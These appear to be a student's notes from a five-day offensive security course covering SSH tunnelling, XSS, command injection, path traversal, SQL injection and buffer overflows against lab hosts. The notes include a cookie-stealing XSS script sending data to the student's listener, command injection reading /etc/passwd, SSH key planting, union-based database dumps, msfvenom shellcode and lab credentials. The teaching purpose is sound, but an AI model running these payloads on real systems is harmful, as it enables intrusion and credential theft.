## Offensive "Security"
  Techniques are outdated, but focus on the methodology.

### SSgt Dow's note taking process:
```
context
command
output
```

Understand the How?
----------------------------------------------------------------------------------
# Day 1 (20240917)
  
## Environment Information:

### Jumpbox Information:
```
Jump Box Website: see below
  10.50.36.14/classinfo.html
Username format: NEDE-006-M
Stack Number: 6
Username: NEDE-006-M
Password: v0cEcUbwIzY878p
JumpBox: 10.50.37.98
```
### vta instances:
```
  windows_opstation_QiJd (win_ops): 10.50.39.134
  Commands: See Below
XFREERDP Syntax: 
xfreerdp /v:10.50.39.134 /u:student /glyph-cache /clipboard /dynamic-resolution
Credentials:
Username: student
Password: password

  linux_opstation_QiJd (nix_ops): 10.50.27.61
    Commands: See Below
ssh student@10.50.27.61 -X
  Credentials:
Username: student
Password: password
```
### CTFD Server:
```
	Website: See below
10.50.20.30:8000
  Username: NEDE-006-M
  Password: v0cEcUbwIzY878p
```

## Tunnels!!!! is Security's better?
  MS(Master Socket)


## set up connection jump box
lin-ops:
```
ssh -MS /tmp/jump student@10.50.37.98
```
  * password:```v0cEcUbwIzY878p```
  * student@jump: ``` 10.50.37.98```
```
for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ; done
```
  * Copy the IPs that were ping sweeped against.
-
## on lin-ops:
```
ssh -S /tmp/jump jump -O forward -D9050
```
student@jump:
```
ss -ntlp
```
  * Port Enumeration
```
proxychains nmap {IPs enumerated}
```
  * Port Validation (Interrogation)
```
proxychains nc {IP} {port}
```
-

      *Port Forward*
  lin-ops:
```
ssh -S /tmp/jump jump -O cancel -D9050

ssh -S /tmp/jump jump -O forward -L127.0.0.1:2222:192.168.28.100:80 -L127.0.0.1:3333:192.168.28.100:2222 -L127.0.0.1:5555:[DifferentIP]:DifferentPort
ss -ntlp
firefox &
```
  * In Firefox URL: 127.0.0.1:2222 ^as specified above *
```
ssh -MS /tmp/tgt1 creds@127.0.0.1 -p 3333
ssh -S /tmp/tgt1 tgt1 -O forward -L127.0.0.1:6666:192.168.10:22 -L127.0.0.1:7777:192.168.50.20:22
ssh -MS /tmp/tgt2 creds@127.0.0.1 -p 6666
```

## Admin Tools (proxychains??):

nmap
 *  nmap scripts locations:
```
/usr/share/nmap/scripts
```


Pen Testing 6 phases
1. Mission Definition
2 Recon
3. Footprinting 
4. Exploitation & Initial Access
5. Post-Exploitation                        * SCP for exfiltration *
6. Documentation

--------------------------------------------------------------------------------

Day 2 (20240918)

http
  client/server relationship

### http methods:
- GET
- POST
- HEAD
- PUT

### http response codes:
- 10X == Informational
- 2XX == Success
- 30X == Redirection
- 4XX == Client Error
- 5XX == Server Error


* If your SQL injection is not getting delivered in a POST request, you can get it via the firefox developer tools and try again as a GET request.

### http Fileds:
- User-Agent (web browser, rendering engine, OS, what was used to communicate with the Server, typically generic, how the client utility describes itself to the server)
- Referer (Beyond scope of course)
- Cookie (data stored on server, for your session. Set cookie field {used for SSO},)
- Data ()
- Server ()
- Set-Cookie ()

HTTP Method Notes
  - GET request can be utilized to pass data to the server using the URL string:
```
http://10.50.x.x/path/pathdemo.php?myfile=demo1
```

### wget
- Recursively download
- Recover from broken transfers
- SSL/TLS support

```
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php
```

### JavaScript (JS) * Runs on the Client's Machine!!!
  - Allows websites to interact with the client
    - Javascript runs on the client's machine
  - Coded as "file.js", or in-line of HTML
 

# Website Enumeration:
- ROBOTS.TXT
- Legitimate surfing (Open Source)
- Tools:
  - NSE scripts
  - Nikto (web scraper)

  - Burp suite (Outside scope of class)
 
## Cross-Site Scripting (XSS) Overview: using unsanitized GET,POST,... reuests to the site

### Reflected XSS: most common
- Attacker uses trusted server to get a payload to the target. 
  - You send a link to target, it redirects them to a website that doesn't have the resource, on the 404 error the payload gets delivered to the target.
 
  - Example:
    http://example.com/page.php?name=dXNlcjEyMw

### Stored XSS: payload resides on the webpage (like a wateringhole attack)
- Resides on vulnerable site
- Only requires user to visit page

- Capturing Cookies
```
document.cookie
```
- capturing keystrokes
  - bind KEYDOWN and KEYUP
- Capturing Sensitive Data
```
document.body.innerHTML
```

## ServerSide Injection

   Directory Traversal/Path Traversal

- Ability to read/execute outside web server's directory
- Uses ``` ../.. ``` (Relative paths) in manipulating a server-side file path

## Malicious File Upload
  Site allows unsanatized file uploads

- Server doesn't validateextension or size
- Allows for code execution (shell)
- Once upload
  - Find your file
  - Call your file

## Command Injection
  Application on the server is vulnerable, allowing execution of arbitrary commands

- User input not validated
  - Common example is a SOHO router, with a web page to allow ping
 

### Might allow the following in it's code:
```
system("ping -c 1 ".$_GET["ip"]);
```
### Run the following to chain/stack our arbitrary command:
```
; cat /etc/passwd
```

### nikto command
```
sudo apt install nikto
```
```
nikto v -h {IP: 10.50.28.11} 
```

----------------------------------------------------------------------

# XSS, Command Injection and HTTP directory traversal demo
	ROBOTS.TXT

User-agent: *
Allow: /uploads
Allow: /chat
Allow: /cmdinjection
Allow: /java
Allow: /path
Allow: /webexample
Disallow: /cross
Disallow: /


User-agent: Googlebot
Disallow: /


User-agent: Baiduspider
Disallow: /

------------------------------
## on website: Command Injection

* find where the user's home directory is, this guy's is "/var/www"
* running command injection at: http://10.50.28.11/cmdinjection/cmdinjectdemo.php
	
	System to ping (xxxx.xxxx.xxxx.xxxx)
```
; cat /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false


www-data:x:33:33:www-data:/var/www:/bin/bash

/var/www/html- is where it serves web files from.

----------------------------------------------------------------------------------------------------

## on lin-ops:
```
ssh-keygen
```
* ^ keep hitting enter to complete this part ^
	
* look in your .ssh directory to verify you gotta Public Key.
```
ls -l /home/student/.ssh
```	
* get your public key.   
```
cat /home/student/.ssh/id_rsa.pub
```
* find where the user's home directory is, this guy's is "/var/www"
www-data:x:33:33:www-data:/var/www:/bin/bash

----------------------------------------------------------------------------
## on website: Command Injection
	* check user's home directory for .ssh/ (ssh related items for user i.e. authorized_keys)
	* if directory doesn't exist, create one
```
; mkdir /var/www/.ssh
```
	* verify whether or not the directory was made:
```
; ls -la /var/www/.ssh
```
```
; echo "{your id_rsa.pub}" >> /var/www/.ssh/authorized_keys
```
	* verify the file was made
```
ls -la /var/www/.ssh/authorized_keys
```
	* verify the public key is in the file that is created.
```
cat /var/www/.ssh/authorized_keys
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuiheEg7vzDqAJdMfRD54ErLV4WKFen6ePe8cnkR0JuhK4GLQxzQuA9CST0P3dBbq4GWZkT3i7VIVuo1XYHSabZRle2MRrsfD1Bd/hX+l5ACplrvWm6W8xJuImcK5WB95pvIgJ7ftgw5Q23b1yqEVpKj6vZfz0a20bWjIGH5S9lW/Kc4IrgBS876Gs76IYoZWaiTOGqcs4qRSmzIMPXAT+ojvSqkVMczs81vh2VbW5fchu6rPies7qBADGWotvHFdgmh+nwkT3tFJUQTN6qhYzvJmLt836Y4scMt3ifUNjOm0syBOghXf3D1SMYfp40ai0HFmIMERtp3zuuhQen9zN student@lin-ops
AAAAB3NzaC1yc2EAAAADAQABAAABAQC44llQmAyqKFQNR83mWv5LhjwPAMgYLDHFcQeAoOhRLaHoAMiV98fHX3y4OLQ5z99PgaQkMSXfHjAkNhGrfKGCIjeJNI7Nvjix9T/bgsX6+/qt00hSyMXaJ1FotS169ovkHMf6glMyTDmlBXieRNlVVfL3Ibo97raty85xlgZ/K+ncptOO901tGD7j/lQfZkOw3BZWYUHau1s3G2tVIeqjPXsTZ5UKmYKj5y/ZOes5FdoyU9ZkLpQ/uy2vDrfvmDxClacW6zbsaNT+X2hixlPDz/TRLsmxLX8VEV8td8j9RbUqBRqZya3HOivr23zN8i5Cn9qIS/gjS4ehmBtEbXVf
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcIirWI5Nw7IdLV6dvbj+pYrgYROEpGcQu6smDwOHzPtW8JwNd7d6sKfyIbuYh6HvuRm4TFLnzdhjHt+NK2BWrOHv2KyM3kyTI4HyXCdeJ4bTDxSU+RZMcKxI1G+XqnHOpLfU+3n/4lAx2j483cA1U0CLyzvVyCGp3kzjJbqypNtyY9X7hKWeGcrO32k3Y9DH4FpxWo4tzBNottiaXmaT3ApS29x3IjftQDQgJGl8mXdtrmTsMqcCGVT2MF0NZSAbzy28rVIL5QiLybcVxZTUF/HdEFSp93OSLK371paYM68rVUaEqtIcMt1Cz47plx/U0RqrVA27o2wTBSykctTkP student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx/uYQSHKRBVCOZvRIjgaLhKiJ6/HRA20xriPtPE4x7Dr1ocOItuu3LVaLxtnbpE4mb1GJNWRqI9ul5YKpH1BNM/JNc3tb74hAmUOBFXJHSAepoDU7UwWhtlewFiYB7cMeUsvgqgZZFS68Xp6VYxp/VlqNc+KAuwRTpRN/s2qt2KaZxtInWRBxpph53S/CuNDJ2DhGmkPEvcMLOXEHfhUSm6DQjohAqmflbpWYYc83Q34IGdyjahOMGE6UoXNSFR7Fzw8a+OVjhGcHGj/XCgizUVo1Ia1wNC55p6Gr3z3TQwE9Hc3r9zInpXdihjdDt9YpKX9NXTtppcGSR97ZQSDh student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDID9u9tewrpC25yvoHgr7XB3mL10gD3zS019rfn99NtVR0So25Wvywgcrw2XXazZ6GUQenxRcD64nGvPfJ6+rsRfVKU75qX9J1cHyV6v5ZKc+Bz9xo+Nk1OF5ikI0pM34UNCDH83L3luzt1eL1J6TejEVbfEcGiFCIOUr9srflveHdWWoTqzCMqfoCh47GzFxjJucZFmtW9ZlusY8dOoUw/sCmfQ5sf4qEOm8wZd7KUj75IJ4OvmPpQL/FHNjaaoEVytk91Uk5Vsb5T+ZluHAjces6mx0V1I4fddHIWcVt0g6kUBOPvt1dCb5SWsgC+/hao9/a15r+Av3n4UlrUAYn student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqzer8pQv5Z8PJvylw1DtJbwz8tjIyPT4t5bxWTVsmJRBf4Rl8zNxOBOqVRhunA+SUirdYXHI/JMHbzEgSLuX6MGPs1jHCkFZM/49/0t2hp3L2QOcV35aWDrkb4XtGF81m2o8+SnDxuALxzQ/eukCN8L523Nj5FQiVzb43RorKNyYDReZbssvKKY29WqlYt/nRL9qeaDWxjebE/859vUzGsolb13VIFwbP8m8LJXEVmQm0QK21aOHmklrYM4X7s1YqvW/nCobrOquRw1QVnDdvuHGdEl5N6S4uMwcfqz57ut/8yKMdqWJVpP9w++RFkGYGsnnfoNPEVkfxrAHPpWv1 student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFY+weRZekm08Fu3/J4idzhzogcYkVUVgRZV6QFVXUGhROkOBCFPTE8AZkGjZTcKrRqPrCXAENV9v/GXo+4jrpQtvA82bQAXQma90i0UtFcn0s9w1P9Lc1Rf8ztzsLbIEkKmStFLxJ6u4lqMvkKubjdtkgYLHwhTpAsuzo2rdkAC++ff2z/UIAkE0mAm/VY7IRQsmRM3k6gTMYjJb4wwp8CxW/z8sYq3Pb7epIw+j4+tHeOlkAdg/ucOyIFcOuwNjIOROCpfxdv2Es8upJbu47m3ykE/JF3muj7o3AoOvl7wy3W2T3Ni8PgKWLyS9ngoD9t39Lp5awJxL4plZFmQrH student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuiheEg7vzDqAJdMfRD54ErLV4WKFen6ePe8cnkR0JuhK4GLQxzQuA9CST0P3dBbq4GWZkT3i7VIVuo1XYHSabZRle2MRrsfD1Bd/hX+l5ACplrvWm6W8xJuImcK5WB95pvIgJ7ftgw5Q23b1yqEVpKj6vZfz0a20bWjIGH5S9lW/Kc4IrgBS876Gs76IYoZWaiTOGqcs4qRSmzIMPXAT+ojvSqkVMczs81vh2VbW5fchu6rPies7qBADGWotvHFdgmh+nwkT3tFJUQTN6qhYzvJmLt836Y4scMt3ifUNjOm0syBOghXf3D1SMYfp40ai0HFmIMERtp3zuuhQen9zN student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfoiFM0HRn9ioK8apYeHXCLTJdNyxZPMHF2KAFcxsLn0PmAnQBVacSrW+ms+JwPv/bzP1sXUvU7w5g2QZX9ydnLr8H74+OeV3d8VXjWtEq8zCfaT3pGqjoFjA7qOcIgmnJ+m5TeuYKgIk6RbT30lQRGFljaDzJQopAagKVHgKKTtVo4I5cAZNgX2x4aBuwIDHmdtskhNvzrQGNVwDG11CeGJMzh6ogZXkpwuRGBxfdsMvElIWDZ8+v78px4YxS4OvbDtNMolzX2cd0Sq55THugYlW3OPX60lzdIhYA7OWHIPSD0FmueiIEc2Kyp4YJePaw9Ll4wy5HqeU30U6+LzZZ student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmQNQv16Fp0fJwAmaTc+YjLuJ86xJdIknvXwKuhW2+uMF7bK46wTTqsQ3+C9zt+6lKUYmSoi0uoSTFJ55fbQ02BfWN36lwYveRd0VcOi//+uOoLkU4G3eqLBgE27NcXT3x0Eq0OoSX4iqVh76ryWWBYJe9U6JzW2A68Bs7xh7fM7rFSgApcR1gw7JWLM8bL8/RdX01Vr1qO5ilvTu7ORnPKo2lj2/BA7tGhu/AKc6gZfxr/AK5hHgBHEOKupqRFx5a8v9WhpLLbqmxPW7KLnkQzDaIWIcJDl+wdaAWosHOIiQT4DgKqtYecIY0sJ3+8IMaYODZstm4Y0fKpm7P+fsr student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/iotegoCeR9SFf2a+lQwHWopj/Yd8nFZ3E6JO1vwo67MoSQsFW2UAqxXfBQs9oMdnkbEI8GixR5QR1Hka3FQa804efbsAxRZaUTHzHHuQr3W/n9Ep6ptstkL+xULLi2Rcsvj+q0dADyjHpUIryI7vOWbfABToPZFgWzjhPpx5TAv1n1o3MT+UbNW0gDsA1mbF8UnX2ZzG2wZ8m33t9WyGsd/HuMLj3TJyzMVNTpdIXGrzz0VXdBODGEtKg2ImYAOXrKyrAYp215gj8pFYhuc9m+U0gwG1xeUrAJc4kbo5JK405lKRA3yByn9v+zfNDgH5hOGSmNsPkUw0EXbCWmvp student@lin-ops
 AAAAB3NzaC1yc2EAAAADAQABAAABAQDyRPRH4uOxB++vpIzMQGCbRpsGmOteHeOH50twyyEMof4u0xM+YxyDDy9f3QYKGNCaL1+GBULgEMbjMZPzVrAB9pVXGJsnXYOTOqLDjIv08s8UlFBZKkQzb/dlyEPQSArj4Yn+U8c9dC7F26xVMr73XiFfmVtx7XztE2qUFPWJR+at8GesGqzM/xpPicXARhoPB2m15lmZaSw04wDCVYn9Z44uvw9y/EKc+nvvp0YZrXW8ia7TvXLC00TA+u3j8dOrCON80+uyOOLXzRK/Vgmp1jTU9A8Ca0fMkVC5TwWYEcPWAfa3/1Kz5fTC/T0cKJLRFEWQ3qTcQjaaTh8T4d2z 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3PbcA1STHUiijJnXAFdOVSFYskTQm6Zj8vJD7w8x8FU2+JN8fW2ono1EIgB8EPbR2Xv4aXctVI5VsFUHN13RCqBSyAMC0ATuPKDH33VKqPzpf0BAVZBH4oTOzloMv6ApAUZo++9GUsF0EZOw72afThOUAFrkHL/UW/j9uOEbgiukFLzE8iyp2IgzXyJnraDR+dqvg7a7NjqR7dcR7uA+7khOdrwZOAS4S2TPh7ej6fSsWc1v2RMx+65PnHtTDNJXPiOHyENcSMhttdf8YgJVzBF9r8KQH1vjs6a1NFkDujnxxRk80KotZbBAH1WdkMTIBa13NnNPc0ggiNsPiH311 student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx/uYQSHKRBVCOZvRIjgaLhKiJ6/HRA20xriPtPE4x7Dr1ocOItuu3LVaLxtnbpE4mb1GJNWRqI9ul5YKpH1BNM/JNc3tb74hAmUOBFXJHSAepoDU7UwWhtlewFiYB7cMeUsvgqgZZFS68Xp6VYxp/VlqNc+KAuwRTpRN/s2qt2KaZxtInWRBxpph53S/CuNDJ2DhGmkPEvcMLOXEHfhUSm6DQjohAqmflbpWYYc83Q34IGdyjahOMGE6UoXNSFR7Fzw8a+OVjhGcHGj/XCgizUVo1Ia1wNC55p6Gr3z3TQwE9Hc3r9zInpXdihjdDt9YpKX9NXTtppcGSR97ZQSDh student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/4ZlYYHPQmcjyOmN6rCvrOU4MZHT/2EIZ17JR/nkvGE3BQ6x2Zv+dXWxjb268F2+eCbBYxEIUU9QaCyK1BrNdJzbgj6tiBsg1w3lTHdDN8+BxKCBpn0FJzUwPrQIHYaB/W1YsmPRAWxFLb48nCWJqUAWCXfR18MTmj46o97tenGtwTMbMLgxsMGIXWbqKEvstFoKvfUAre/9sGOWWOneQw6QVqYYv+9YgUoi9/aKfGGefguwaWkqYoy5p6tT10upDtodtUYizoF05uYy6lmFgesgAi1vZtOB72Piu7AKz8WEzuFwWz+bFH6tcyTfQkrrhi5MdxIA20De3vrMtxt+1 student@lin-ops
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5rS3kC2o4vqMXTe68VU48WzXrPSZ+WzUXwTWVvZYTcCjFXJ921scwTv7QQS/J+kB4PKD/k8kgAACtlEe5Y/LYfeWxPT50GvnKRJpCUUiw5g4OCa9vnDrYgjlql4vO9Z7Vk/6mjP84Rg+jTKgn1kg8USPA3eSAVAIpIjONRTTYLZIDAwuhmIhkJuGYoD4mpiF2+qq05TUcGiC/iA+DWDiDF8lvXejmQ1oCo3aPpXkJIoOYulGf5I285p2XXz5fjK2J7mN80HrPn7zDeVWYEcvBa1Td4E9phOAR3xU1kj82anwFpp3O342Fcv5eoDjzqKyCHWnc/GiQGiTUdj4Jgq0Z student@lin-ops

----------------------------------------------------------------------------
## on lin-ops
 * make a new socket, and ssh into the web server, and loggon
	- sending private key to encrypt the begging of the conversation. This allows the client to authenticate.

 ```
 ssh -i .ssh/id_rsa -MS /tmp/web www-data@127.0.0.1 -p {} 
 ```
	
 * Congrats, you did a ssh  masquerade

-----------------------------------------------------------------------------

## on web server: Directory Traversal via HTTP POSt/GET methods:
http://10.50.28.11/path/pathdemo.php
	* POST method: It cat's so try
```
../../../../../etc/passwd
```
  ^ ../.. ^ do at least 8 times to be safe

* GET method: interacting with radio buttons, changing the url on the website.
	
--------------------------------------------------------------------------------------

## on lin-ops:
* make a http server via python3:
```
python3 -m http.server
```
----------------------------------------------
## On webpage:
* put the script on webpage
	
```
<script>document.location="http://10.50.27.61:8000/?" + document.cookie;</script>
```
^ lin-ops IP ^
		
-----------------------------------------------------------------------------------

# Day 3 (20240918)

SQL Standard Commands:
```

* SELECT: Extracts data from a database

* UNION: Used to combine the result-set of two or more SELECT statements

USE: Selects the DB to use

UPDATE: Updates data in a database

DELETE: Deletes data from a database

INSERT INTO: Inserts new data into a database

CREATE DATABASE: Creates a new database

ALTER DATABASE: Modifies a database

CREATE TABLE: Creates a new table

ALTER TABLE: Modifies a table

DROP TABLE: Deletes a table

CREATE INDEX: Creates an index (search key)

DROP INDEX: Deletes an index

```
we will use as ```UNION SELECT```


### SQL Injection Considerations:
- req. valid SQL Queries
- Is info_schema DB available
- GET Request vs POST Request methods

### Unsanitized vs Sanitized Fields
Can be found using a Single Quote => '
- Will return extraneous information.
- ' closes a variable, to allow for additional statements/clause
- May show no errors or 


# POST Method (Interacting with input fields)
### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4: Craft more tailored queries


## step 1: Determine the vulnerable field
```{option}' OR 1='1```
## step 2: Identify number of columns
```
{option}' UNION SELECT 1,2,3,4 #
{option}' UNION SELECT 1,2,3,4,5 #
```
## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)

* 4 columns displayed, column 2 hidden
```
UNION SELECT table_schema,table_name,column_name from information_schema.columns #
```
```
UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
```
## step 4:  Craft more tailored queries

```
'{option:Audi} 'UNION SELECT TYPE,2,cost,color,year from session.car #'
```
```
'Audi ' UNION SELECT carid,2,type,name,year from session.car #'
```
```
---------------------------------------------------
session |	Tires 		tireid 		5
session |	Tires 		name 		5
session |	Tires 		size 		5	
session |	Tires 		cost 		5
session |	car 		carid 		5	
session |	car 		name 		5
session |	car 		type 		5
session |	car 		cost 		5
session |	car 		color 		5
session |	car 		year 		5
session |	session_log 	session_id| 	5
session |	session_log 	user_id 	5
session |	session_log 	remote_ip 	5
session |	session_log 	status 		5
session |	session_log 	start 		5		
session |	session_log 	last_access| 	5
session |	user 		id 		5
session |	user 		name 		5
session |	user 		pass 		5
session |	userinfo 	studentID 	5
session |	userinfo 	username 	5
session |	userinfo 	passwd 		5
session |	userinfo 	jump 		5
session |	userinfo 	prid 		5
----------------------------------------------------
```



# GET Method (Interact with URL)

### step 1: Determine the vulnerable field
### step 2: Identify number of columns
### step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
### step 4:  Craft more tailored queries

## step 1: Determine the vulnerable field
- Choose {option} from radio button, then click submit
  - interact with url:
```
{Selection}=4 OR 1=1 (for each selection 1..4)
```


## step 2: Identify number of columns
``` 
Selection=2 UNION, SELECT 1,2,3
```

## step 3: Edit Golden Statement to Dump DataBases (Gives you the database,tables and columns)
``` 
UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
## step 4:  Craft more tailored queries
``` 
UNION SELECT table_schema,column_name,table_name from information_schema.columns
```
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Day 3 (20240918)

## Reverse Engineering

### X86_64 Assmebly

* 16 general purpose 64-bit registers
```
%rax - the first return register
%rbp - the base pointer that keeps track of the base of the stack
%rsp - the stack pointer that points to the top of the stack
```
You will will see arguments passed to the functions as something like:
```[%ebp-0x8]```

### X86_64 Assembly - Common Terms

- HEAP: Memory that can be allocated and deallocated
- STACK: A contiguous section of memory used for passing arguments
- GENERAL REGISTER: A multipurpose register that can be used by either programmer or user to store data or a memory location address
- CONTROL REGISTER: A processor register that changes or controls the behavior of a CPU
- FLAGS REGISTER: Contains the current state of the processor



### X86_64 Assembly - Memory Offset
* There is one instruction pointer register that points to the memory offset of the next instruction in the code segment:

```
64-Bit	Lower 32 bits	Lower 16 bits	Descrition

RIP	EIP		IP		Instruction Pointer; holds address for next instruction to be executed
```

### Stack: First in Last out.

```
MOV: move source to destination
PUSH: push source onto stack
POP: Pop top of stack to destination
INC: Increment source by 1
DEC: Decrement source by 1
ADD: Add source to destination
SUB: Subtract source from destinationdisass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point

Questions?
7
GDB UsesInstallation of Peda Plugingit clone https://github.com/longld/peda.git ~/peda echo "source ~/peda/peda.py" >> ~/.gdbinit Common Commandsdisass <FUNCTION> # Disassemble portion of the program info <...> # Supply info for specific stack areas x/256c $<REGISTER> # Read characters from specific register break <address> # Establish a break point
CMP: Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
JMP: Jump to specified location
JLE: Jump if less than or equal
JE: Jump if equal
```

* Reverse Engineering Workflow (Software):
- Static
- Behavioral
- Dynamic
- Disassembly
- Document Findings

Patch Code:

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Day 4 (20240924)


* stringcopy function, what thh hacker on the Tony Hawk video utilized.


## Buffer Overflows
```
Heap:
Stack:
----------
Registers:
----------
Instruction Pointer (IP):
Stack Pointer (SP):
-------------------
Base Pointer (BP):
------------------
Function:
---------
Shellcode:
```

* Buffer Overflow Defenses:
  - Non executable (NX) stack
  - Address Space Layout Randomization (ASLR)
  - Data Execution Prevention (DEP)
  - Stack Canaries (Stack Smashing detection)
  - Position Independent Executable (PIE)

* Technical Help
	Tools:
- IDA, GHIDRA
- GDB, MONA, IMMUNITY
- BASH, PYTHON

GDB Uses:
```
git clone https://github.com/longld/peda.git ~/peda echo "source ~/peda/peda.py" >> ~/.gdbinit Common Commands

disass <FUNCTION> # Disassemble portion of the program 
info <...> # Supply info for specific stack areas 
x/256c $<REGISTER> # Read characters from specific register 
break <address> # Establish a break point
```

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

win-ops

After downloading the "func" file

### On PowerShell:

running strings:
```
z:\strings.exe func
```
results:
- GCC
- GNU
- GLIBC

run a get-content:
```
get-content -First 2 func
```
results:
- ELF

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

lin-ops

```
stings func
```
```
file func
```
```
chmod u+x
```
```
./func
```
takes a string then closes.

Command substitution
```
./func $(echo "aaaa") 
```

```
./func <<<$(echo "aaaa") 
```


use python not python3
```
vim buffer.py
```
```
#!/usr/bin/env python

buffer = "A" * 100

print(buffer)
```


gdb w/ peda plugin, 
```
gdb-peda$
```
commands:
- run
- shell
- info functions
- pdisass
- 
```
pdisass getuserinput
```

gdb-peda, use bash as it's shell.

```
run <<<$(./buffer.py)
```

```
env - gdb ./func
```
in "clean" gdb, so no plugins
```
unset env COLUMNS
unset env LINES
```

get jmp esp
```
find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP)
```

get memory map locations:
```
info proc map
```

```
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
```

or you can load up msfconsole.

```
./func <<<$(./buffer.py)
```


- unset environmentals
- run executable, break the buffer
- run proc map
- first memory adress after heap, and the very last address in the stack
	- ``` find /b 0xf7de1000, 0xffffe000, 0xff(hex for jump command), 0xe4(hex for ESP) ```
- grab the first 4 memory addresses, change from little to big endian
	- nop sled ``` nop = "\x90" * 15 ```
- either msfconsole or msfvenom to generate the shellcode
	- ie

```
buf =  b""
buf += b"\xda\xca\xba\xf7\xa8\x24\x7c\xd9\x74\x24\xf4\x5f"
buf += b"\x33\xc9\xb1\x0b\x83\xef\xfc\x31\x57\x15\x03\x57"jdb
buf += b"\x15\x15\x5d\x4e\x77\x81\x07\xdd\xe1\x59\x15\x81"
buf += b"\x64\x7e\x0d\x6a\x04\xe8\xce\x1c\xc5\x8a\xa7\xb2"
buf += b"\x90\xa9\x6a\xa3\xa4\x2d\x8b\x33\xdc\x45\xe4\x52"
buf += b"\x4f\xfc\xfa\xc3\xdc\x77\x1b\x26\x62"
```

Have to do on 2 machines, your's and the targets...

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Day 5 (20240925)

Windows Exploit Development.

## Walkthrough:


- use strings
- run it in the environment
- ```netstat -anop tcp``` match to the port that we found in strings analysis
- Open Immunity, while process is running. 
 - "CPU - thread"
  - file
   - attach
    - Look at the ```bottom right``` and if it says ```pause``` go to the ```top left``` and click the ```play button``` so it says ```running```.

- go to your lin-ops workstation and build a script

	### Script name "WinExploit.py" in home dir
```
#!/usr/bin/env python

import socket

buf = " " 

s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM ) ## Create IPv4, tcp
s.connect(("192.168.65.10", 9999)) ## Private IP of WinOps and secureserver port
print s.recv(1024) ## Print to screen what we recieve
s.send(buf) ## Send our buf variable
print s.recv(1024) ## Print to screen what we recieve
s.close ## Close the socket
```
- run via python 2 on lin-ops
```
python WinExploit.py
```
results:
```
Welcome to SecureServer! Enter HELP for help.

UNKNOWN COMMAND
```
- modify your script to have ```"HELP"``` as the value in the buf variable.
- then go to (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) and generate a 5000 character pattern
- tokk that pattern and pasted that in the script under the ```buf = "TRUN /.:/"``` in a new variable ```buf += " 5k pattern"
- we run the script and that gives us the EIP, we plug EIP in the website for the offset and that gives us the offset.
- we replaced 5k pattern with the offset value, we also add ```"BBBB"``` to verify that it took.
## Script now
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "BBBB"

